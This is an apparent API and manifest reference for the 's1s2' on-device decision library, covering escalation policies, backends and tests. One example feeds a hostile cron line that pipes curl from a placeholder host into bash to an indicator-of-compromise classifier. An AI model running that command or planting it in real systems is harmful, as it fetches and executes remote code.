# s1s2: API and manifest reference

The long-form reference. The [README](../README.md) has the short version and the status of what is measured.

## Minimal example

A manifest task (any label set; tokens optional), and a margin policy whose threshold you measured yourself:

```jsonc
// in the manifest, next to "builds"
"tasks": {
  "sentiment": { "type": "choice", "instructions": "What is the sentiment of this review?",
                 "choices": ["positive", "negative", { "value": "mixed", "description": "both praise and complaints" }] }
},
"escalation": { "metric": "margin", "below": { "choice": 0.2 }, "to": "generate",
                "provisional": true, "source": "your calibration: 15% quantile of dev margins" }
```

```js
import { S1S2, thresholdFromQuantile } from "@s1s2/web";

const lib = await S1S2.load({ manifest: "manifests/my-model.json" });      // runtime "auto"
const s = await lib.decide({ input: "Arrived late, but works great.", questions: ["sentiment"] }, { escalate: true });

s.answers[0];               // illustrative values
// { name: "sentiment", type: "choice", choice: "mixed", probabilities: [...], confidence: 0.55,
//   margin: 0.14,          // p(1st) - p(2nd)
//   rawMargin: 0.29,       // logit gap: ln(0.55 / 0.41)
//   path: "escalated",
//   escalation: { reason: "margin", metric: "margin", margin: 0.14, threshold: 0.2, provisional: true,
//                 source: "your calibration: ...", to: "generate", text: "...", sharedPrefill: true } }

const why = await s.generate("Explain the decision in one sentence.", { maxNewTokens: 64 });
await s.dispose();
await lib.dispose();

// A threshold is a measurement of YOUR build and readout, e.g. the margin below which 15% of a dev set falls:
const t = thresholdFromQuantile(devAnswers.map((a) => a.margin), 0.15);
```

The CT0 manifest without tasks, with plain Decisions-API questions:

```js
const lib = await S1S2.load({ manifest: "manifests/ct0-alias3-micro-1026.json" });
const s = await lib.decide({
  input: "path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash",
  questions: [
    { name: "ioc", type: "predicate", instructions: "Is this an indicator of compromise?" },
    { name: "kind", type: "choice", instructions: "Which vulnerability class does this code contain?",
      choices: ["dom-xss", "info-disclosure", "exfil-egress"] },
    { name: "sev", type: "score" },                       // manifest default instructions + levels
  ],
});
// s.answers: [{ name: "ioc", type: "predicate", probability: 0.97, confidence: 0.97, margin: 0.94, rawMargin: 3.5,
//               method: "logits", path: "s1", raw }, ...]
const why = await s.generate("Explain the decision in two sentences.", { maxNewTokens: 128, question: "ioc" });
why.text; why.sharedPrefill; // true on genai / decode-only / litert: continued from the decision's kept prefill
await lib.generate("Write a cron entry that rotates logs.", { maxNewTokens: 64 }); // System 2 alone
```

## Margin and the margin policy

Every answer has:

| field | |
|---|---|
| `margin` | probability of the top label minus the runner-up (predicate: `\|2p − 1\|`), in [0, 1]. This is the definition the int4 -> int8 escalation test used. Score via logits: top-1 minus top-2 level probability (the reported level is the rounded expectation). `null` for the score head (a scalar has no runner-up). |
| `rawMargin` | the same gap in the readout's raw score space (logit gap or head-score gap). It does not saturate when p does; units differ per model, build and readout. `null` for the score head. |
| `path` | `"s1"`, or `"escalated"` when a policy acted; then `escalation` records `metric`, `margin` (the value read), `threshold`, `provisional`, `source`, `to`, and per target: `build` + `from` (the System-1 answer it replaced), or `text` + `sharedPrefill` + `reusedTokens` + `finishReason`. |

Policy (`EscalationSpec`), at four levels merged in order **manifest < build < task < call**:
`{ metric?: "margin" | "rawMargin", below?: { predicate?, choice?, score? }, to?: "generate" | { build }, prompt?, maxNewTokens?, provisional?, source? }`.
An answer escalates when its `metric` is **strictly below** the threshold for its type; a type without a threshold
never escalates. `decide(..., { escalate: true })` applies the manifest's policy; an object is merged on top (and may
carry `target`, an engine for `{ build }`). Thresholds without a `to` are refused.

- `to: { build: "<name>" }`: the low-margin questions are read again on that build of the same manifest (fresh
  prefill there), and its answer replaces the System-1 one. `S1S2.load` loads the build on first use, once, and frees
  it with `lib.dispose()`; `S1S2.fromBackend` instances need `withBuildLoader(fn)`. A second graph in memory is a real
  cost (an int8 graph is roughly twice an int4 one).
- `to: "generate"`: System 2 on the same weights, greedy, after the decision prompt **without** the decided answer
  (manifest `generation.escalate`, else `generation.continue` with an empty answer), with `prompt` (default:
  "Reconsider the question above step by step, then state your final answer as one of: {options}."). It continues
  from the kept decision prefill where the backend keeps one (`sharedPrefill: true`) and prefills the same ids again
  otherwise. The text is attached; **the typed decision is not changed** (parsing a label out of free text is left
  to the caller).

**What is and is not measured.** The library has **no default threshold**: `MARGIN_POLICY_DEFAULTS` holds only the
prompt and token budget, marked `"provisional - no measured threshold"`, and any threshold without `provisional: false`
is reported as provisional. An early exploratory dev probe found:
where a model's readout works, the int4 margin predicts int4-vs-bf16 decision flips (AUC 0.86–0.99), and escalating
the lowest-margin 15% catches 57–100% of them against 15% for a random gate; but those flips are 3–6% of items and
about half are benign, so at most ~1 pp of accuracy is at stake. A later test with the threshold fixed in advance then confirmed, at a fixed 15% dev quantile, that int4 -> int8 escalation catches more flips than a random
gate in 5 of 6 cells (not on SmolLM2-135M), with −0.1 to +2.7 pp of accuracy at stake. **Escalating System 1 to System 2 by margin is not measured anywhere**, and was not part of
that test. See [system1-on-device-patterns.md](system1-on-device-patterns.md).

## Evidence selector (which sentence shows it)

With a build head of type `"evidence"`, `decide()` can also point to the sentence of the input that is the evidence,
in one more forward pass (no generation). The prompt is the manifest's own choice layout with one option per sentence
(whitespace collapsed); the head reads the query at the decide marker and one key at each option marker, softmax over
the sentences, ties to the first. It shares the input prefix with the questions and keeps no state (System 2 continues
from a question's prefill, never from the evidence prompt).

```js
const s = await lib.decide({
  input: passage,
  questions: [{ name: "retention", type: "choice", instructions: "...", choices: [" Yes", " No"] }], // optional
  evidence: { requirement: "retention (how long personal data is kept)", sentences },              // sentences optional
});
s.evidence; // { index, sentence, probability, probabilities, sentences, margin, rawMargin, raw, method: "head" }
```

Manifest: `evidence: { instructions, sentencePrefix?, source? }`, where `instructions` is the question the head was trained with
(`{requirement}` is filled from the request; `evidence.instructions` in the request replaces it, untested wording), and
a head in the build: `heads: { "evidence-005": { file, types: ["evidence"] } }`. `sentencePrefix` is prepended to each sentence
inside its option when the head was trained with a separator the option template does not carry (plain-text
markers: `" "`, because the template's decision labels already start with a space). Without `sentences` the input is split
by `splitSentences` (break after `. ! ? …` before whitespace, no abbreviation list); this is a convenience and not the
segmentation any measurement used, so pass your own sentences when the result matters. `margin` is p(1st) − p(2nd),
the same definition as the answers'; no margin policy acts on it.

**What is measured.** These heads were trained on the GDPR/LGPD specialists (SmolLM3-3B, S5-nano, Jurema-7B joint s1;
bf16 PyTorch): on a held-out set scored once under a rule fixed in advance, the chosen sentence was a concise hit above chance and above a content-blind rule in all six
model × law cells (GDPR, LGPD composite passages). **Whether the int4 browser graph
picks the same sentences is not measured yet** (one descriptive check, on development items only).

## Tasks (any label set)

`manifest.tasks.<name>`: `{ type, instructions, choices? | levels?, tokens?, method?, escalation? }`. Labels are
strings or `{ value, description?, token? }`; a pinned `token` (`{ id, text }`, all labels or none, checked by
decoding at load) is what the logits readout reads for that label; without pinned tokens a task label is read as
the first token it adds after the rendered prompt, whatever the manifest's global `logits.choice.map` says, except
`"letters"`, where a choice task reads its option keys like a free-form question. A
predicate task may pin its own `tokens: { yes, no }`. A question names a task by string (`"sentiment"`) or as
`{ name?, task, instructions?, method? }` (labels always come from the task). Manifests without `tasks` behave as
before; the SmolLM2 manifests and the CT0 manifest validate unchanged.

## Related work

Typed one-pass decisions became a crowded space in late 2026; this package does not claim the idea.

- **open-jev** 0.1.2 (Nico Martin, npm): a browser library on transformers.js with `kev-0.6b` / `kev-4b` (Qwen3-Base
  with an exported pointer head) and a DeBERTa model. Its README: "Nothing is generated"; "the graph is a custom
  pointer-head export, not a text generator". s1s2 ports its KEV encoding and question shape (`NOTICE`).
- **ONNX Runtime GenAI** 0.19.0: `NonGenerativeSession` ("CLM ranking and KEV decision packages", PR #2649) and the
  `examples/python/d1-decisions.py` example (`append_tokens` + `get_logits`, no generation). Native only (C, C++,
  Python); there is no JavaScript API (issue #895). In Python, S1 then S2 on one `Generator` is possible by hand.
- **Liquid AI d1** (d1-3B, d1-2B, d1-omni-600M): open decision models; the card says d1 "does not write text" and
  answers "in one forward pass with zero output tokens" (license lfm1.0).
- **OpenAI Decisions API**: cloud only (`gpt-6-luna`), predicate / choice / score with probability and confidence;
  text generation goes through the Responses API. s1s2's request shape follows it.
- **TypeSafe Jev** ("System One" models): closed; "Jev gives up string generation". We avoid that product name.
- Margin-based escalation for quantized models: arXiv 2611.14418 (margin/entropy predicts low-precision argmax
  flips), which the lab's dev probe reproduced on its own models.

## API

### `decide({ input, questions?, method?, evidence? }, { method?, keepState?, escalate? })`

`evidence: { requirement?, instructions?, sentences? }` adds `session.evidence` (see Evidence selector); `questions`
may then be omitted.

Shaped like the OpenAI Decisions API.

| field | |
|---|---|
| `input` | a string, or messages `[{ role, content }]` with `input_text` / `input_json` parts (no images) |
| `questions[]` | `{ name, type, instructions, choices?, levels?, method? }`, a task name, or `{ name?, task, instructions?, method? }` |
| `type` | `"predicate"` (alias `"noul"`), `"choice"`, `"score"` |
| `choices` | strings or `{ value, description }` (shown to the model as `value: description`) |
| `levels` | strings or `{ label, description }`, first = lowest |

Also accepted: open-jev question objects `{ type: "choice"|"score"|"noul", instructions, options, descriptions? }`,
as an array or keyed by name (`questions: { area: {...}, refund: {...} }`).

Answers echo `name` and carry `margin`, `rawMargin` and `path` (above). `predicate`: `probability` = P(true), `confidence` = max(p, 1-p).
`choice`: `choice`, `probabilities` [{ value, probability }], `confidence` = top probability.
`score`: `score` = probability-weighted 0-based level index, `level` = nearest label, `probabilities`
[{ value: index, label, probability }], `confidence` = top probability. `confidence` follows open-jev
(the Decisions guide does not define it).

**Readouts** (`method`, per call or per question; default per type from the manifest):

- `logits`: next-token logits at the last prompt token. Predicate: sigmoid(L[yes] − L[no]). Choice: first token
  of each value after the prompt (or the option keys A, B, ... as the model writes them after the cue: " A" when the
  tokenizer has that token and the prompt does not end in whitespace, else after an appended lone-space token as for
  scores; or the id pinned per label in `logits.choice.tokens`, when the manifest says so; lab manifests pin the contract's label ids, since with kev markers the option text "Yes" is
  not the cue's " Yes"); the values must start with **distinct** tokens, otherwise `decide` throws; with pinned
  tokens, a value outside the pinned labels throws. Score: the manifest's level tokens (CT0: `1`..`5`) or the first token of each label.
- `head`: bilinear pointer head (ct0-edge `head.bin` format) on hidden states read at marker tokens:
  query = decide marker, key = last token (predicate, score) or each option marker (choice). The hidden state
  is the graph output named in the manifest, already **after the final norm**; no norm is applied in JS
  (exactly as ct0-edge). A score head gives a scalar: `score = sigmoid(raw)·(levels−1)`, `probabilities: null`.
- `both`: the head answer, plus the logits answer of the same forward pass in `answer.logits`.

Questions about the same input share the prefill of the common prefix (system turn + state) on backends with
snapshots, then each question runs only its own tokens.

Exact reuse on WebGPU: onnxruntime-web (1.31.1, int4 genai graphs) computes any token fed in a prefill block shorter
than 32 tokens on a different numeric path (up to ~0.5 logit apart), so the genai backend never feeds a
block shorter than 32 (`minBlock`, `genai: { minBlock: 0 }` turns it off): the shared prefix stops at least 32 tokens
before each question's end (64 when its state is kept), and a kept state stops 32 tokens before the end of its
prefill. Shared prefill and prefix reuse are then bit-identical to a full prefill (Chrome on an Apple M2 Pro, published
Qwen3-0.6B package: 32 of 32 decisions, 6 of 6 System-2 continuations); the cost is up to 64 tokens prefilled again per question. Prompts shorter
than 64 tokens keep no state (`sharedPrefill: false`, a fresh prefill of the same ids).

### Session: `s.generate(prompt, { question?, think?, maxNewTokens, temperature, ..., onToken })`

Continues **after** the decision prompt of `question` (default: the first): appends the decided answer, closes the
turn, and opens a new user turn with `prompt` (manifest `generation.continue`). The token ids are the decision
prompt's ids followed by the separately tokenized continuation; they are never re-tokenized. With a state-keeping
backend the kept prefill is reused (`sharedPrefill: true`, `reusedTokens` = tokens served from the kept state: on genai the decision prompt length minus 32, see exact reuse above); otherwise the
**same ids** are prefilled again (`sharedPrefill: false`), so both paths see identical input.

`decide(..., { keepState: false })` keeps nothing. Kept states live until `s.dispose()`.

## Backends

| runtime | where | System 1 reads | shared prefill (`s.generate`) | multi-question prefix reuse |
|---|---|---|---|---|
| `genai` (ONNX Runtime GenAI graph) | browser WebGPU (onnxruntime-web), browser CPU/WASM when the build lists `"wasm"`, Node CUDA (onnxruntime-node), Node CPU when the build lists `"cpu"` | logits, head | **yes** (GPU state kept) | yes |
| `decode-only` (ONNX Runtime) | browser WebGPU/WASM, Node CPU/CUDA | logits, head | **yes** | yes |
| `litert` (LiteRT.js 2.6.0) | browser WebGPU | logits, head | **yes** (host copy of the state) | yes |
| `transformers.js` | browser WebGPU/WASM, Node CPU/CUDA | logits, head | no, fresh prefill (`sharedPrefill: false`) | no |
| `webllm` (MLC) | browser WebGPU | logits; head via hidden recovered from logits | no, fresh prefill | no |

`"auto"`: browser with WebGPU → genai, decode-only, transformers.js; without WebGPU → genai (WASM, builds listing
`"wasm"`), decode-only (WASM), transformers.js (WASM); Node with CUDA → genai, transformers.js; Node CPU →
transformers.js, decode-only. genai runs on onnxruntime-node CPU only for builds listing `"cpu"`. `litert` and
`webllm` are only picked when asked for (`runtime` or `build`).

### Browser CPU fallback (WASM)

CPU fallback: without WebGPU, `S1S2.load` runs builds whose manifest lists device `"wasm"` on the browser CPU (onnxruntime-web WASM; `model.device === "wasm"`, opt out with `cpuFallback: false`): 7.5–16.5× slower than WebGPU, same decisions in ≥116/120 items (120 development items per task, Chrome on an Apple M2 Pro); long inputs (ContractNLI) on the 1.7B and 3B models did not fit a 2-hour budget for 120 items. S5-nano cannot run there (no WASM kernel for GatedDeltaNet).

* WebGPU is "absent" when `navigator.gpu` is missing or `requestAdapter()` gives no adapter (`webgpuStatus()` returns
  the reason). With `device: "auto"` (default) the loader then picks a genai build that lists `"wasm"`, also when
  `build` names it. It never tries a build that does not list `"wasm"`: the error names WebGPU's state and each
  build's devices. `device: "wasm"` (or `"cpu"` in the browser) asks for the CPU path even when WebGPU exists.
* `cpuFallback: false`: with `device: "auto"` and no WebGPU, throw instead of moving to the CPU (any runtime).
* After load: `model.device` is `"webgpu"` or `"wasm"`; on an automatic move `model.fallbackReason` says why.
  Warn users about speed when it is `"wasm"`.
* The route is the one measured on the browser CPU: the `onnxruntime-web/wasm` bundle (`ort-wasm-simd-threaded.wasm`,
  not the WebGPU/JSEP binary), `InferenceSession.create(graph, { executionProviders: ["wasm"], externalData })` with
  ORT's default threads and optimization level, then the same genai backend (`wrapSession`) as WebGPU. Pass
  `modules.ort` to use another onnxruntime-web module. ORT uses several threads only on a cross-origin isolated page
  (COOP `same-origin` + COEP `require-corp`); the study page was isolated (4 threads), so without isolation expect
  slower than the figures above.
* A packager adds `"wasm"` to a build's `devices` only after measuring that path for that graph (kernels and
  decisions against WebGPU). Qwen3.5-family graphs (S5-nano, CT0) cannot: onnxruntime-web 1.31.1 has no WASM kernel
  for `com.microsoft.GatedDeltaNet`. `s1s2-convert` does not add it.

## Manifest (`schema: "s1s2.manifest/1"`)

Validated at load (`validateManifest`, every problem listed). Then the loader asserts: the tokenizer's encoding of
every manifest token (EOS, yes/no, level tokens, kev delimiters) equals the manifest id; tagged-encoding markers are
checked in context (a rendered probe prompt must hold an accepted marker token at every read position); each head's
`hiddenSize` and the graph's hidden width equal `hiddenSize`; the vocabulary covers every manifest token; the
graph exposes the named hidden output.

| key | |
|---|---|
| `id`, `base: { repo, revision }` | base model, revision = 40-hex commit sha |
| `hiddenSize`, `layer: { read: "final", norm: "in-graph" }` | hidden width read by the heads |
| `tokenizer: { repo, revision, files: { tokenizer, config } }` | tokenizer.json / tokenizer_config.json, pinned |
| `eos`, `warmup` | `[{ id, text }]` |
| `encoding` | `kind: "tagged"`: `template` with `{state}` `{question}` (chat template inline), `question` per type (`{instructions}`, `{options}`), `option` (`{label}`, `{key}`, `{index}`), `forbiddenInLabels`, `escapeSpecial`, `escapeLiterals` (plain-text markers neutralized in caller text: first character -> `‹`). `kind: "kev"`: `delimiters` { state, question, optionStart, optionEnd, decide } as `{ id, text }` (open-jev layout), optional `prefix`/`suffix`, `predicateOptions` |
| `markers` | `decide`, `option`, `last`: `{ text, at: "last-token"|"token", tokens: [{ id, text }] }`; the token at every read position must be one of `tokens` (BPE merges: CT0's option marker reads `><` or `></`) |
| `readout` | head key per type: predicate `"last"` (or `"options"` for kev [no, yes]), choice `"option"`, score `"last"` |
| `logits` | `predicate: { yes, no }`, `choice: { map: "first-token"|"letters"|"tokens", tokens?: [{ label, id, text }] }`, `score: { map: "tokens"|"first-token", tokens?, lead? }` (`lead`: text appended after the prompt before the level tokens are read; default `" "` when the tokenizer writes the space before a level as its own token, as SmolLM2/3 do; heads keep their read position) |
| `defaults` | `method` per type, `instructions?` per type, `levels?`, `maxSafeTokens?` |
| `generation` | `turn` (`{system}{prompt}{think}`), `system`, `think: { on, off }`, `continue` (`{answer}{prompt}{think}`), `escalate?` (`{prompt}{think}`, no `{answer}`), `answers.predicate` [no, yes] |
| `tasks?` | named label sets (see Tasks) |
| `escalation?` | margin policy defaults (also per build: `builds.<name>.escalation`) |
| `evidence?` | `{ instructions, sentencePrefix?, source? }`: the evidence selector question (`{requirement}`); the head is a build head with `types: ["evidence"]` |
| `builds.<name>` | `runtime`, `repo`, `revision`, `files: { role: { path, sha256, size? } }`, `hiddenOutput`, `heads: { name: { file, types } }` (types: question types or `"evidence"`), `devices` (`webgpu` browser GPU, `wasm` browser CPU via onnxruntime-web, `cpu` Node onnxruntime-node, `cuda`), `dtype?`, `modelId?`, `kvHeadDim?`, `maxSafeTokens?`, `fidelity` (null until the lab fills it: `{ reference, n, decisionChanged, orderInversion, measuredAt }`) |

File roles: genai `model`, `data` (+ `genaiConfig`, `embeddings` for exclude_embeds builds); decode-only `model`, `data`; transformers.js `model` (+ data, config files);
webllm `config` (+ `lib`, `recoveryRows`, `recoveryP`); litert `manifest`, `graph`, `weights`, `embed`.

**Integrity.** URLs are `.../resolve/<revision>/<path>`. Small files are sha256-hashed after download. Large weights
handed to a runtime by URL in the browser are checked with the Hub's `paths-info` at the pinned revision (sha256 and
size from Hub metadata; the bytes are not re-hashed in the browser). In Node every file goes through the cache
(`~/.cache/s1s2/<revision>/<repo>/<path>`, or `localDirs` mirrors read in place) and is fully hashed once.
Non-Hub large files need `allowUnverified: true`. Any mismatch throws `IntegrityError`.

## S1S2 package spec, validator, converter

* Spec: [`spec/s1s2-package.md`](spec/s1s2-package.md) (0.2-draft) + JSON Schema [`spec/s1s2-manifest.schema.json`](spec/s1s2-manifest.schema.json).
* Validator: `node bin/s1s2.mjs validate <manifest.json | package dir | dir of package dirs> [--strict] [--manifest-only]`
  (`npx s1s2 validate <dir>` once linked). Schema + `validateManifest` + pinned-file sha256/size, head.bin parse.
* `node bin/s1s2.mjs encode <manifest> --tokenizer-dir <dir> --in rows.jsonl --out out.jsonl`: the ids and read positions
  s1s2 builds (tokenizer only).
* Converter (HF model + labelled JSONL -> package): [`converter/`](converter/README.md).
* Head types (spec 6, all peers; which one to recommend is open): `pointer` (`head.bin` in the
  alias3-web layout, read with `scale = header.scale ?? 1/sqrt(headDim)`, or fp32 safetensors), `linear` (pplx/d3
  readout, JEV slots + softcap), `joint` (Clef: `jointScores`, `encodeJointSchema`; not routed by `decide()` yet), label
  logits with per-type `logits.temperature`; out-of-graph final RMSNorm per build (`norm`, alias3-web `norm.bin`).
* Converters from published head formats, each writing a fidelity record against the format's own reference code:
  [`converters/heads/`](converters/heads) (`s1s2-heads from-kev-headpt | from-gguf-kev | from-alias3-web |
  from-decision-config | from-jev | from-transformers-decision | from-lm-rows | from-clef`).

## Fidelity harness (`s1s2/fidelity`)

Pure computation over JSONL files: `agreement(reference, build)` (decisions changed %, Wilson 95% CI, per type,
missing ids), `fidelityReport(reference, { build: outputs })`, and an **order-inversion** test:
`invertQuestion` reverses the option order of a choice question, `orderInversion(original, inverted, { maxFlipPct })`
counts flipped decisions and returns `pass` (yes/no). `runCases` / `runOrderInversion` take an injected `decide`,
`fidelitySlot` produces the manifest `fidelity` object.

## Node CPU note

Node CPU with onnxruntime-node 1.30 on Node >= 24: `nodeFloat16Workaround(ort)` (called by the loader) keeps fp16
tensor data in `Uint16Array`; with native `Float16Array` the binding reads fed-back KV caches as empty.

## Tokenizers, embeddings outside the graph, ONNX Runtime versions

- **SentencePiece tokenizers (EuroLLM, Salamandra).** The lab marker's last token `>` is a piece without `▁`: alone it
  encodes to `▁>`, and decoding inserts `▁` after special tokens, so neither "encode the marker alone" nor offsets
  from incremental decoding hold. Marker and label tokens are verified where they are read: the load-time check
  renders a probe prompt and requires an accepted marker token at every read position (plus `decode([id]) == text`);
  when decoding does not reconstruct the prompt, read positions come from prefix encoding exactly as the specialists' prompt builder does (stable boundary required); the logits label token is the first token that
  `encode(prompt + label)` adds after `encode(prompt)`, as the specialists' label contract does. Byte-level BPE prompts keep
  the character-offset path unchanged. EOS, warmup, yes/no and kev delimiters still must encode alone to their id.
  Checked: the lib reproduces the lab plans (ids, decide and option positions, label ids) on 3064/3064 dev prompts of
  EuroLLM-1.7B-Instruct and salamandra-2b-instruct, and 100% of the SmolLM2/SmolLM3 plans
  (`test/sentencepiece.test.mjs` covers the same rules with a toy SentencePiece tokenizer).
- **exclude_embeds builds (Jurema).** A genai build may pin `files.embeddings`: fp16 little-endian `[vocab,
  hiddenSize]` (`embed_tokens.fp16.bin`), size pinned. The graph then takes
  `inputs_embeds` (no `input_ids`) and the backend looks the rows up per chunk; Node reads the verified local file,
  the browser keeps tables up to 300 MiB in memory (sha256-checked) and reads larger ones with HTTP Range (the server
  must answer 206). Checked: synthetic `input_ids` vs `inputs_embeds` graphs over one table are bit-identical
  (`test/embeddings.test.mjs`); SmolLM2-135M built with `exclude_embeds=true` (GenAI 0.19) and a table dequantized from
  the normal build's int4 `GatherBlockQuantized` gives logits identical to the normal build (Δ = 0, 20/20). With the
  lab's table (bf16 -> fp16) the same 20 items give 18/20 equal decisions: the normal int4 build quantizes the tied
  embedding to int4, the exclude_embeds build feeds fp16 rows, so the two builds are different numerics.
- **GatedDeltaNet (S5-nano, GenAI 0.19).** The builder emits `com.microsoft::GatedDeltaNet` with packed QKV in input 0
  and inputs 1-3 empty. Those inputs are `Optional` from onnxruntime 1.31.0 (tag v1.31.0, 2026-10-09; on main since ORT #32708,
  2026-10-01, which carries #33013) and the WebGPU kernel is ORT #32510 (2026-09-17); onnxruntime-web 1.31.0-dev.20260914 and onnxruntime-node 1.30.0 refuse
  the graph ("input 1 is marked single but has an empty string"). The first npm releases that accept it are
  **onnxruntime-web 1.31.1** and **onnxruntime-node 1.31.1** (there is no 1.31.0 on npm). There is no CPU kernel in
  1.31.x ("Failed to find kernel"); it first appears in onnxruntime-node 1.32.0-dev.20261108-d93f5446f (ORT #33817,
  dev only). The graph cannot be rewritten legally under the 1.30 schema (the inputs are positional and required).
  `devDependencies` pin onnxruntime-web 1.31.1; `test/smoke/gdn_webgpu.mjs` runs the builder's exact node
  (`test/tools/make_gdn_graph.py`) in Chrome/WebGPU against a numpy reference of the recurrence.
- **EP-placement check on onnxruntime-web 1.31.** One EP taking the whole graph is logged as "All nodes placed on
  [EP]" (accepted). ONNX Runtime prints the placement lines only for the first session of a wasm instance, so
  `verifyEp` works for the first genai session of a page (one model per page, as the lab runner does).

## Tests

`npm test` (typecheck, build, `node --test test/`). `test/margin.test.mjs` covers margins, the margin policy (both
targets, kept vs re-prefilled state, policy levels) and tasks against mock backends; its thresholds are test values. `test/evidence.test.mjs` covers the evidence selector (layout = the choice layout over the
sentences, shared prefix, no kept state, ties, escaping, errors, manifest validation) with synthetic heads. Unit tests use the real CT0 tokenizer (fetched once at the pinned
revision, sha256-checked) and ct0-edge's fixtures: all 172 prompts, token ids and read positions are reproduced, and
the head/logits numbers of `ask_expected.json`. Backends are tested against mocks. `npm run test:smoke` loads the real
CT0 decode-only q4 build on the Node CPU (heavy: about 4 GB of RAM);
`node test/smoke/parity_ct0_edge.mjs` compares `decide()` with ct0-edge 1.0.0 `askMany()` on the same session
(measured: identical to 4e-16 on predicate/choice/score, head and logits). `test/wasm.test.mjs` covers the browser
CPU fallback with a simulated browser (planning, session options, refusals, `cpuFallback`);
`PLAYWRIGHT_DIR=… node test/smoke/browser_wasm.mjs` loads a published manifest in headless Chrome without WebGPU and
checks `device === "wasm"` on `ort-wasm-simd-threaded.wasm` plus one decision.

## Limitations

- Margin thresholds are per model, build, readout and task; none ships; measure one on your own build.
- `to: "generate"` returns text; it does not turn that text into a decision.

- `S1S2.load` / `decide()` take text only (no images, no audio): audio packages load with `loadMedia` (see [`spec/MULTIMODAL.md`](../spec/MULTIMODAL.md)). Messages are flattened to `role: text` lines into the state slot.
- The tagged encoding reads fixed prompt structure; a manifest for a new model must state its markers, and the
  heads are trained for one template (CT0's choice/score heads expect CT0's question wording, hence the defaults).
- A score head gives a scalar, not a distribution (`probabilities: null`, `confidence: null`).
- `s.generate()` continues under the decision's system prompt (CT0: "answer with exactly one word"), so System-2
  text after a decision can differ in style from `lib.generate()`.
- kev encoding: each question is a separate branch after the shared state (positions restart after the state);
  open-jev's kev graphs instead put all branches in one sequence with a block-causal mask.
- `transformers.js` and `webllm` cannot keep a prefill: `sharedPrefill: false`, the same ids are prefilled again.
- Browser large-file checks trust Hub metadata (paths-info) rather than hashing gigabytes in the page.
- Order inversion is measured on choice questions only (predicate and score have no option order in the tagged
  encoding).

## Media (audio; experimental)

`loadMedia({ manifest, baseUrls | localDirs, modules, device, allowUnverified })` loads a media package (a manifest whose
`modalities` has no `"text"`) and returns an `AudioModel`.

- `model.decide({ audio, questions })` returns `{ answers, cost }`. An answer is a `PredicateAnswer` or a `ChoiceAnswer`
  (same `probability`, `confidence`, `margin`, `rawMargin`) plus `modality`, `task`, `decision` (by the reader's own threshold) and
  `threshold`; a question the input cannot answer is `{ available: false, reason }`. `cost` = `{ ms, parts, passes, backend, device }`.
- Audio: `questions` are task names (`voice_activity`, `turn_end`, `same_speaker`, `speaker_change`, `speaker_count`); `audio` is
  mono float32 at 16 kHz (other rates are refused). `model.encode(audio)` runs the tower once, `model.read(encoding, tasks)` runs readers on it.
- `validateMediaManifest`, `mediaProblems`; `s1s2 validate` checks media manifests too (schema, rules, pinned files).
